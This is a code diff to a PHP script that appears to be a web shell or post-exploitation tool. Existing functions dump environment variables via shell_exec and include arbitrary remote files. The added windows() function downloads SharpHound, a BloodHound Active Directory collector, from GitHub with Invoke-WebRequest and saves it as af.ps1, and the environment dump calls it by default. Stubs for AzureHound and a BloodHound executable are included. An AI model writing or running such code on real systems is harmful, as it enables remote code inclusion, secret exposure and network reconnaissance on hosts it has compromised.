@@ -234,6 +234,8 @@ function showEnv($os)
             echo(shell_exec('env'));
         } elseif ($os == "Windows") {
             echo(shell_exec("SET"));
+            echo("Pulling down sharphound, PS1 version, this is default.\n");
+            windows("bh");
         } else {
             return null;
         }
@@ -304,6 +306,24 @@ function remoteFileInclude(string $targetFile)
 {
     if (!empty($targetFile)) {
         include ($targetFile) or die("Could not remote import :(\n");
+    }
+}
+
+function windows($com){
+    if (!empty($com)){
+        switch (strtolower($com)){
+            case "bh":
+                echo("Pulling SharpHound..\n");
+                $bh_url = "https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Collectors/SharpHound.ps1";
+                shell_exec("Invoke-WebRequest -Uri ". $bh_url . " -OutFile af.ps1");
+                break;
+            case "azh":
+                echo("Pulling Azurehound...\n");
+                break;
+            case "bhe":
+                echo("Pulling Bloodhound Executable!\n");
+                break;
+        }
     }
 }
 
